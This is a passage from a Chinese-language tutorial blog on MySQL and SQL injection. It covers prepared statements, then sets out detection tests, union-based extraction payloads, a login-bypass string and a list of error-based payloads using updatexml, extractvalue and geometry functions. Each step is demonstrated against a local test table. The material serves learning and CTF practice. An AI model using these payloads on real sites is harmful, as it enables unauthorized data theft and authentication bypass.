<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">mysql&gt; execute A using @name;</span></span><br><span class="line"><span class="section">+----+----------+----------+</span></span><br><span class="line"><span class="section">| id | username | password |</span></span><br><span class="line"><span class="section">+----+----------+----------+</span></span><br><span class="line"><span class="section">|  3 | bao      | 3        |</span></span><br><span class="line"><span class="section">+----+----------+----------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>可以看到这里是大小写不敏感的</p>
<p>所以其实一整个预处理的语句的语法就是</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PREPARE</span> stmt_name <span class="keyword">FROM</span> preparable_stmt;//定义预处理语句</span><br><span class="line"><span class="keyword">set</span> @<span class="type">name</span> = <span class="string">&#x27;&#x27;</span>;//定义语句中需要的变量</span><br><span class="line"><span class="keyword">execute</span> stmt_name <span class="keyword">using</span> @<span class="type">name</span>;//执行预处理语句</span><br><span class="line">&#123;<span class="keyword">DEALLOCATE</span> | <span class="keyword">DROP</span>&#125; <span class="keyword">PREPARE</span> stmt_name//释放预处理语句</span><br></pre></td></tr></table></figure>

<h3 id="13-show-status语句"><a href="#13-show-status语句" class="headerlink" title="13.show status语句"></a>13.show status语句</h3><p>用 SHOW  STATUS 语句可以查看存储过程和函数的状态</p>
<p>语法</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span>    &#123; <span class="keyword">PROCEDURE</span>   |   <span class="keyword">FUNCTION</span>   &#125;  STATUS   [  <span class="keyword">LIKE</span>  <span class="string">&#x27;pattern&#x27;</span>  ]</span><br></pre></td></tr></table></figure>

<p>   SHOW STATUS 语句是  MySQL 的一个扩展。它返回子程序的特征，如数据库、名字、类型、创建者及创建和修改日期。如果没有指定样式，根据使用的语句，所有的存储程序或存储函数的信息都会被列出。PROCEDURE  和  FUNCTION  分别表示查看存储过程和函数；LIKE  语句表示匹配存储过程或函数的名称。</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250520135904729.png" alt="image-20250520135904729"></p>
<p>例如我们需要查看存储过程</p>
<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW <span class="function"><span class="keyword">PROCEDURE</span> <span class="title">STATUS</span></span></span><br></pre></td></tr></table></figure>

<p> 在 MySQL 中，存储过程和函数的信息存储在 information_schema 数据库下的 Routines 表中，可以通过查询该表的记录来查询存储过程和函数的信息</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>   *   <span class="keyword">FROM</span>   information_schema.<span class="keyword">Routines</span></span><br></pre></td></tr></table></figure>



<h2 id="MYSQL注入前提"><a href="#MYSQL注入前提" class="headerlink" title="MYSQL注入前提"></a>MYSQL注入前提</h2><p>可以实行注入的地方，通常是一个可以与数据库进行连接的地方，比如搜索框，登录界面，但凡存在参数输入的情况都有可能是存在sql的</p>
<h3 id="INFORMATION-SCHEMA库"><a href="#INFORMATION-SCHEMA库" class="headerlink" title="INFORMATION_SCHEMA库"></a>INFORMATION_SCHEMA库</h3><p>我们可以了解到，在mysql&gt;5.0以上版本里都存在一个自带的信息数据库INFORMATION_SCHEMA，这个数据库存储着MYSQL服务器里的其他数据库的全部信息如数据库名，数据库的表，表中的列和数据，所以我们可以通过这个数据库去获取其他数据库的信息，这也是我们后面要讲的绝大多数注入姿势里面都会用到的</p>
<ul>
<li>SCHEMATA：里面存储着mysql所有数据库的基本信息</li>
<li>TABLES：里面存储着mysql中的表信息，包括表的创建时间更新时间等等</li>
<li>COLUMNS：里面存储着mysql中表的列信息，包括这个表的所有列以及每个列的信息，包括列的数据类型，编码类型等</li>
</ul>
<p>但是这个只有在5.0以上的数据库中才能用到这个信息数据库，而如果低于5.0的话就不能用了，这个我学了再写上去</p>
<p>我们正常的sql查询语句是</p>
<p>字符型</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * from &lt;表名&gt; <span class="built_in">where</span> <span class="built_in">id</span> =’<span class="variable">$_GET</span>[<span class="built_in">id</span>]‘;</span><br></pre></td></tr></table></figure>

<p>数字型</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * from &lt;表名&gt; <span class="built_in">where</span> <span class="built_in">id</span> =<span class="variable">$_GET</span>[<span class="built_in">id</span>];</span><br></pre></td></tr></table></figure>

<h3 id="1-判断是否存在SQL注入"><a href="#1-判断是否存在SQL注入" class="headerlink" title="1.判断是否存在SQL注入"></a>1.判断是否存在SQL注入</h3><p>单引号判断法，即在参数后面加上单引号（无论字符型还是整型都会因为单引号个数不匹配而报错）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;fron users where id = 1&#x27;</span><br></pre></td></tr></table></figure>

<p>常见的闭合方式</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">常见的闭合方式：&#x27;&#x27;、<span class="string">&quot;&quot;</span>、<span class="punctuation">(</span>&#x27;&#x27;<span class="punctuation">)</span>、<span class="punctuation">(</span><span class="string">&quot;&quot;</span><span class="punctuation">)</span>等</span><br></pre></td></tr></table></figure>

<p><strong>闭合的作用</strong>：为了<strong>使前一段语句正常执行</strong>且<strong>去掉后面语句的限制</strong>，对于后面的语句我们可以用注释符号注释掉</p>
<p>常见的注释符号就是:<code>-- -</code>,<code>#</code>,<code>%23</code></p>
<h3 id="2-判断注入方式"><a href="#2-判断注入方式" class="headerlink" title="2.判断注入方式"></a><strong>2.判断注入方式</strong></h3><ul>
<li>• 数字型：当输入的<strong>参数为整形</strong>时，称为数字型注入</li>
<li>• 字符型：当输入的<strong>参数为字符串</strong>时，称为字符型注入</li>
</ul>
<p><em>为什么要判断数字型还是字符型<br>答：构造恶意</em><code>sql</code>语句时，数字型无需判断闭合方式，字符型需要判断闭合方式</p>
<p><strong>数字型判断：</strong></p>
<p>用最经典的and 1&#x3D;1和and 1&#x3D;2进行判断，数字型一般提交内容为数字，<strong>但数字不一定是数字型</strong></p>
<p>假设某个注入的注入类型是数字型，那么</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?select * <span class="keyword">from</span> information where <span class="attribute">id</span>=1 <span class="keyword">and</span> <span class="attribute">1</span>=1页面运行正常</span><br><span class="line"></span><br><span class="line">?<span class="attribute">id</span>=1 <span class="keyword">and</span> <span class="attribute">1</span>=2页面运行错误</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250829112852026.png" alt="image-20250829112852026"></p>
<p>为什么呢?</p>
<p>在a and b运算中，当使用 <code>AND</code> 运算符时，只有当所有条件都为真时，整个条件才被视为真。</p>
<p>解释：当输入 and 1&#x3D;1时，后台执行 Sql 语句：select * from &lt;表名&gt; where id &#x3D; x and 1&#x3D;1，语法正确且逻辑判断为正确，所以返回正常。</p>
<p>当输入 and 1&#x3D;2时，后台执行 Sql 语句：select * from &lt;表名&gt; where id &#x3D; x and 1&#x3D;2，语法正确但逻辑判断为假，所以返回错误。</p>
<p>假设这里是字符型判断的话，我们输入的语句就会有以下的执行情况：</p>
<p>当输入1 and 1&#x3D;1，1 and 1&#x3D;2时，后台执行 Sql 语句：</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> &lt;表名&gt; <span class="keyword">where</span> <span class="built_in">id</span> = ‘x <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>’</span><br><span class="line"></span><br><span class="line">select * <span class="keyword">from</span> &lt;表名&gt; <span class="keyword">where</span> <span class="built_in">id</span> = ‘x <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>’</span><br></pre></td></tr></table></figure>

<p>查询语句将 and 语句全部转换为了字符串，并没有进行 and 的逻辑判断，所以不会出现以上结果，故假设是不成立的。</p>
<p><strong>字符型判断：</strong></p>
<p>也是用最经典的 and ‘1’&#x3D;’1 和 and ‘1’&#x3D;’2来判断</p>
<p>假设某个注入的注入类型是字符型</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1’ <span class="keyword">and</span> ‘1’ = <span class="string">&#x27;1&#x27;</span>--+,页面运行正常</span><br><span class="line"></span><br><span class="line">?<span class="attribute">id</span>=1’ <span class="keyword">and</span> ‘1’ = <span class="string">&#x27;2,页面运行错误</span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250829112948597.png" alt="image-20250829112948597"></p>
<p>解释：当输入 and ‘1’&#x3D;’1时，后台执行 Sql 语句：select * from &lt;表名&gt; where id &#x3D; ‘x’ and ‘1’&#x3D;’1’语法正确，逻辑判断正确，所以返回正确。</p>
<p>当输入 and ‘1’&#x3D;’2时，后台执行 Sql 语句：select * from &lt;表名&gt; where id &#x3D; ‘x’ and ‘1’&#x3D;’2’语法正确，但逻辑判断错误，所以返回异常。</p>
<p>还有一个方法就是运用运算去进行判断</p>
<p>数字型是可以计算的，但字符型无法进行计算</p>
<p>例如</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用减法计算<span class="built_in">id</span>值</span><br><span class="line"></span><br><span class="line">数字型会得到<span class="built_in">id</span>=1的数据</span><br><span class="line"><span class="keyword">select</span> * from <span class="built_in">users</span> <span class="built_in">where</span> <span class="built_in">id</span> = 2-1; </span><br><span class="line">字符型会得到<span class="built_in">id</span>=2的数据</span><br><span class="line"><span class="keyword">select</span> * from <span class="built_in">users</span> <span class="built_in">where</span> <span class="built_in">id</span> = <span class="string">&#x27;2-1&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250829113021895.png" alt="image-20250829113021895"></p>
<h2 id="sql注入分类"><a href="#sql注入分类" class="headerlink" title="sql注入分类"></a>sql注入分类</h2><ul>
<li>有回显</li>
</ul>
<ol>
<li>回显有正常信息:union联合注入</li>
<li>回显有报错信息:报错注入</li>
</ol>
<ul>
<li>无回显</li>
</ul>
<ol>
<li>页面无回显时，利用返回页面判断来判断查询语句正确与否:布尔盲注</li>
<li>页面无回显时，利用时间延迟语句是否已经执行来判断查询语句正确与否:时间盲注</li>
</ol>
<ul>
<li>允许同时执行多条语句时，利用逗号同时执行多条语句的注入:堆叠注入</li>
</ul>
<h2 id="1-UNION联合注入"><a href="#1-UNION联合注入" class="headerlink" title="1.UNION联合注入"></a>1.UNION联合注入</h2><h3 id="什么是联合注入？"><a href="#什么是联合注入？" class="headerlink" title="什么是联合注入？"></a>什么是联合注入？</h3><p>联合注入即union注入，其原理就是，在我们原先查询语句的基础上通过union去拼接上我们的select语句，然后我们拼接的查询结果会和前面的select语句的查询结果进行拼接并返回到页面(关于UNION的操作可以返回去看搭建数据库时的讲解)</p>
<p>联合注入的利用条件，UNION 拼接的 SELECT 语句必须拥有相同数量的列，列也必须拥有相似的数据类型，每条 SELECT 语句中的列的顺序必须相同，也就是说只能：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> table_name1 <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="keyword">from</span> table_name2;</span><br></pre></td></tr></table></figure>

<p>这也是为什么我们在联合注入之前往往需要先利用 <code>order/group by n</code> 判断字段的数量。</p>
<p>假设此时我们的数据库中一个表的内容是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| id | username   | password |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">|  1 | test       | 123456   |</span><br><span class="line">|  2 | bao        | 1008611  |</span><br><span class="line">|  3 | wanth3f1ag | 1008     |</span><br><span class="line">|  4 | 1008       | 11111    |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>假设此时我们的sql查询语句是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = ?</span><br></pre></td></tr></table></figure>

<p>注入步骤(假设有3列)</p>
<ul>
<li>判断字段数</li>
</ul>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="keyword">order</span> <span class="title">by</span> <span class="number">4</span>--+</span><br></pre></td></tr></table></figure>

<p>因为前面说过，order by是对字段进行排序，所以如果我们的4大于我们的字段数，就会出现报错，所以字段数是3</p>
<p>但是需要注意的是，这里的列数指的是前面查询语句的字段名的个数，而不是全部的字段名</p>
<blockquote>
<p>[!CAUTION]</p>
<p>这里要提醒一下，在数据库中的测试和在web页面的测试所用的语句是不一样的</p>
</blockquote>
<p>数据库测试语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = 1 order by 4;</span><br><span class="line">select * from users where id = 1 order by 3;</span><br><span class="line">select username from users where id = 1 order by 1;</span><br><span class="line">select username from users where id = 1 order by 2;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250829113421679.png" alt="image-20250829113421679"></p>
<ul>
<li>判断回显位</li>
</ul>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">1</span>&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>这里的话就是结合的虚拟临时表的内容，下面会讲到</p>
<p>数据库查询语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = 1 union select 1,2,3;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250829113527116.png" alt="image-20250829113527116"></p>
<ul>
<li>查询数据库名</li>
</ul>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(schema_name)<span class="keyword">from</span> information_schema.schemata)--+</span><br></pre></td></tr></table></figure>

<p>GROUP_CONCAT()用于将分组内的值连接成一个以逗号（或其他分隔符）分隔的字符串,所以这也是为什么我们返回的多个数据库名，表名，列名都是以逗号去分开的原因</p>
<p><code>union</code>后的数字1和2只用于凑列数，无任何实际意义（可以换为其他内容）</p>
<p>数据库查询语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = 1 union select 1,2,convert((select group_concat(schema_name)from information_schema.schemata)using utf8mb4);</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250829114140616.png" alt="image-20250829114140616"></p>
<p>哎？为啥这里需要用到一个convert(using utf8mb4)么？其实是因为mysql中union要求两个 SELECT 返回的列类型必须兼容，并且字符列的 <strong>collation</strong> 必须可以统一，不然会报错，但是在web应用中往往会有对collation进行自动处理，所以这也是为什么需要注意在mysql中测试和页面测试的不同</p>
<p>很快，在10月份的?CTF上就遇到一个没自动处理的sql注入问题，这时候就需要bypass Collation了</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20251011170450499.png" alt="image-20251011170450499"></p>
<p>下面的就不继续说了，语句都是一样的</p>
<ul>
<li>查询表名</li>
</ul>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema = database())--+</span><br></pre></td></tr></table></figure>

<ul>
<li>查询表中列名</li>
</ul>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name</span> = <span class="string">&#x27;表名&#x27;</span>)--+</span><br></pre></td></tr></table></figure>

<ul>
<li>查询列中数据</li>
</ul>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,列名 <span class="keyword">from</span> 数据库名.表名--+</span><br></pre></td></tr></table></figure>

<p><strong>MySQL &gt;&#x3D; 5.0的情况下就是我们常规的union联合注入了，MySQL &lt; 5.0没有information_schema</strong>，联合注入打不通</p>
<p>所以简单来说步骤就是:</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">判断字段数-&gt;判断回显位置-&gt;爆数据库-&gt;爆表名-&gt;爆字段名<span class="function"><span class="params">(列名)</span>-&gt;</span>爆数据</span><br></pre></td></tr></table></figure>

<p>到这的话我们顺便提一下这个联合注入的一个小技巧，也就是插入临时表</p>
<h3 id="插入临时表"><a href="#插入临时表" class="headerlink" title="插入临时表"></a>插入临时表</h3><p>什么意思呢?在使用联合注入时，如果我们查询的数据不存在，那么就会生成一个内容为null的虚拟临时数据，比如我们的payload是</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">union</span> <span class="literal">select</span> <span class="string">&#x27;wantheflag&#x27;</span>,<span class="string">&#x27;123123&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250829114511676.png" alt="image-20250829114511676"></p>
<p>可以看到这里生成了一个临时的username和password，所以我们在联合注入下可以利用这一技巧去设置一个username和password然后可以利用这个临时数据去进行登录，例如</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查询语句</span><br><span class="line">select username,password <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">username</span>=<span class="string">&#x27;$_GET[username]&#x27;</span> <span class="keyword">and</span> <span class="attribute">password</span>=<span class="string">&#x27;$_GET[pass]&#x27;</span></span><br><span class="line">payload</span><br><span class="line"><span class="attribute">username</span>=users&#x27; union select <span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;123123&#x27;</span>--+&amp;<span class="attribute">password</span>=123123</span><br></pre></td></tr></table></figure>

<h4 id="特-万能密码"><a href="#特-万能密码" class="headerlink" title="特:万能密码"></a>特:万能密码</h4><p>就是用永真语句进行登录，最常用的就是</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>1&#x3D;1恒为真。由于OR运算符的两侧只要有一侧为真，整个表达式就为真，因此整个查询条件就恒为真。</p>
<h2 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2.报错注入"></a>2.报错注入</h2><p>通过<strong>特殊函数</strong>的错误使用使其参数被页面输出，但是前提是服务器开启报错信息返回，也就是发生错误时会返回报错信息</p>
<p>报错注入（Error-based）的利用条件是：</p>
<ol>
<li>SQL 操作&#x2F;函数 报错</li>
<li>构造会出现执行错误的 SQL 查询语句，将需要获取的信息（如版本、数据库名）放到会在错误信息输出的位置</li>
<li>网站回显数据库执行的报错信息，得到数据库信息</li>
</ol>
<p>常见的利用函数有updatexml()、extractvalue()、floor()+rand()等，参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2869#toc-25">SQL注入总结</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1.floor()和rand()</span><br><span class="line">union select count(*),2,concat(&#x27;:&#x27;,(select database()),&#x27;:&#x27;,floor(rand()*2))as a from information_schema.tables group by a       /*利用错误信息得到当前数据库名*/</span><br><span class="line">2.extractvalue()</span><br><span class="line">id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br><span class="line">3.updatexml()</span><br><span class="line">id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br><span class="line">4.geometrycollection()</span><br><span class="line">id=1 and geometrycollection((select * from(select * from(select user())a)b))</span><br><span class="line">5.multipoint()</span><br><span class="line">id=1 and multipoint((select * from(select * from(select user())a)b))</span><br><span class="line">6.polygon()</span><br><span class="line">id=1 and polygon((select * from(select * from(select user())a)b))</span><br><span class="line">7.multipolygon()</span><br><span class="line">id=1 and multipolygon((select * from(select * from(select user())a)b))</span><br><span class="line">8.linestring()</span><br><span class="line">id=1 and linestring((select * from(select * from(select user())a)b)</span><br><span class="line">9.multilinestring()</span><br><span class="line">id=1 and multilinestring((select * from(select * from(select user())a)b))</span><br><span class="line">10.exp()</span><br><span class="line">id=1 and exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>

<h3 id="XPATH-报错"><a href="#XPATH-报错" class="headerlink" title="XPATH 报错"></a>XPATH 报错</h3><p>updatexml和extractvalue两种</p>
<p>利用条件：Mysql &gt;&#x3D; 5.1</p>
<h4 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml()报错注入"></a>updatexml()报错注入</h4><p><strong>Updatexml()函数:</strong></p>
<ul>
<li>主要用于更新XML类型的数据。</li>
<li>适用于需要修改XML数据中的节点值或插入新节点的场景。</li>
<li>在数据库维护和数据更新方面有着广泛的应用。</li>
</ul>
<p>语法</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">updatexml</span><span class="params">(<span class="string">&#x27;XML_document&#x27;</span>,<span class="string">&#x27;Xpath_string&#x27;</span>,<span class="string">&#x27;New_value&#x27;</span>)</span></span></span><br></pre></td></tr></table></figure>

<p>XML_document：String格式，为XML文档对象的名称</p>
<p>XPath_string ：Xpath格式的字符串 </p>
<p>new_value：String格式，替换查找到的符合条件的数据</p>
<p>注入过程</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">查询数据库：id=<span class="number">1&#x27;</span> <span class="keyword">and</span> (<span class="function"><span class="keyword">select</span> <span class="title">updatexml</span>(<span class="params"><span class="number">1</span>,concat(<span class="number">0x7e</span>,(database(</span>)),0x7e),1))#</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">查询表名:id</span>=<span class="number">1&#x27;</span> <span class="keyword">and</span> (<span class="function"><span class="keyword">select</span> <span class="title">updatexml</span>(<span class="params"><span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=database()),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="meta">#</span></span><br><span class="line"></span><br><span class="line">查询列/字段名:id=<span class="number">1&#x27;</span> <span class="keyword">and</span> (<span class="function"><span class="keyword">select</span> <span class="title">updatexml</span>(<span class="params"><span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name</span>=<span class="string">&#x27;表名&#x27;</span>),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="meta">#</span></span><br><span class="line"></span><br><span class="line">查询数据：id=<span class="number">1&#x27;</span> <span class="keyword">and</span> (<span class="function"><span class="keyword">select</span> <span class="title">updatexml</span>(<span class="params"><span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(列名</span>) <span class="keyword">from</span> 数据库名.表名),0x7e),1))#</span></span><br></pre></td></tr></table></figure>

<p>测试结果</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250829115111487.png" alt="image-20250829115111487"></p>
<p>当然也可以使用limit，利用limit进行分页，作用是展示第几条数据，因为xpath报错返回的信息长度是有限的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id = 1 and convert((select updatexml(1,concat(0x7e,(select group_concat(schema_name)from information_schema.schemata),0x7e),1))using utf8mb4);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~information_schema,mysql,mytest&#x27;</span><br></pre></td></tr></table></figure>

<p>最多会返回32个字符左右</p>
<p>我们拿第一个爆数据库的语句解释一下payload</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; and (select updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select database()),<span class="number">0</span>x7e),<span class="number">1</span>))#</span><br></pre></td></tr></table></figure>

<p><code>concat(0x7e, (select database()), 0x7e)</code>：</p>
<ul>
<li><code>concat()</code> 是一个字符串拼接函数，它会将传入的参数连接成一个完整的字符串。</li>
<li><code>0x7e</code> 是十六进制的 <code>~</code>，这里的作用是将返回的数据用 <code>~</code> 包裹，便于分辨。</li>
<li><code>(select database())</code> 是一个子查询，用于获取当前数据库的名称。</li>
<li>整体的作用是生成一个看起来像 <code>~database_name~</code> 的字符串。</li>
</ul>
<p>最后的查询结果</p>
<ul>
<li><code>updatexml()</code> 函数的第一个参数 <code>1</code> 和第三个参数 <code>1</code> 并没有实际意义，因为它们并非合法的 XML 文档或路径。</li>
<li>第二个参数 <code>concat(0x7e, (select database()), 0x7e)</code> 会生成一个类似 <code>~database_name~</code> 的字符串</li>
</ul>
<p>但是这个语句会报错，因为 <code>updatexml()</code> 的第一个参数不是有效的 XML 文档，所以 MySQL 会抛出一个错误，这个错误信息会包含 <code>concat</code> 函数生成的字符串，即当前数据库的名称。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id = 1 and convert((select updatexml(1,concat(0x7e,(select database()),0x7e),1))using utf8mb4);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~mytest~&#x27;</span><br></pre></td></tr></table></figure>

